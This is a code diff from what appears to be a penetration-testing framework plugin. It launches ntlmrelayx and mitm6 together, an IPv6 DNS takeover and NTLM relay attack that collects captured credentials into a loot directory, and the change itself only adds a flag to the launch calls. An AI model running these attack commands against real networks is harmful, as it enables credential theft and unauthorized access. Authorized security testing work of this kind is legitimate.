@@ -57,10 +57,10 @@ def main(apiclient, appli, **kwargs):
     cmd = f"ntlmrelayx -tf {file_name} -6 -wh {address} -of {relaying_loot_path}/"
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
-    appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for mitm6", f"{cmd}")
+    appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for mitm6", f"{cmd}", use_pollex=False)
     cmd = f"mitm6 -i {device} -d {domain}"
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
-    appli.launch_in_terminal(kwargs.get("default_target",None), "mitm6", f"{cmd}")
+    appli.launch_in_terminal(kwargs.get("default_target",None), "mitm6", f"{cmd}", use_pollex=False)
     return True, f"Listening ntlmrelayx with mittm6 opened, loot directory is here:"+str(relaying_loot_path)+"\n"
     
